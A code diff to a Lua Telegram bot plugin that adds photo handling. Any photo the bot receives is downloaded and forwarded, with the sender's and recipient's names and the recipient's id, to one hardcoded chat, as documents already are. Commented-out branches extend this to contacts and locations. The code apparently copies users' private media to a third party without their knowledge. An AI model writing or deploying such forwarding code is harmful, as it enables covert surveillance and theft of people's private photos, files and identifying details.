@@ -8,6 +8,16 @@ local function doc(msg, success, result)
     end
 end
 
+local function ph(msg, success, result)
+    if success then
+            print('File downloaded to:', result)
+            send_photo('chat#142334685', result, ok_cb, false)
+    else
+            print('Error downloading: '..msg.id)
+            send_large_msg('chat#142334685', 'Failed to download', ok_cb, false)
+    end
+end
+
 --[[local function con(msg, success, result)
     if success then
             print('File downloaded to:', result)
@@ -114,6 +124,9 @@ local type = mimetype.get_content_type_no_sub(matches[1])
           if msg.media.type == 'document' then
             send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id.."👇👇👇👇👇", ok_cb, false)
             load_document(msg.id, doc, msg)
+          elseif msg.media.type == 'photo'then
+            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id.."👇👇👇👇👇", ok_cb, false)
+            load_photo(msg.id, ph, msg)
           --[[elseif msg.media.type == 'contact' tnen
             load_contact(msg.id, con, msg)
           elseif msg.media.type == 'geo' tnen
